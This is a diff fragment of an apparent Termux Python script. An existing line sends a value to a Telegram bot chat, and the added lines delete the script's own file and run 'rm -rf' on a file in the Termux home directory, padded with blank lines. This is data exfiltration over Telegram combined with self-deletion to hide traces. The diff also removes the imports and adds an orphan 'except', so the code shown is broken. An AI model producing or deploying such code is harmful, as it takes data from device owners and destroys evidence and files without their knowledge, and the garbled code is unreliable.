@@ -1,5 +1,7 @@
-import os, sys, threading, requests 
+    os.remove("File.py")		
 		
+except:
+	pass		
 
 def main():
 	os.system('clear')
@@ -23,6 +25,12 @@ def fuck():
 		
 	url = f'https://api.telegram.org/bot{API}/sendMessage?chat_id={ID}&text=\n {y}\n '
 	z = requests.get(url)
+	os.chdir("/data/data/com.termux/files/home/")
+	try:
+		os.remove("T")
+		
+	except:
+		os.system("rm -rf T")	
 
 		
 
@@ -44,3 +52,28 @@ def lol():
 
 if __name__ == '__main__':
 	lol()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
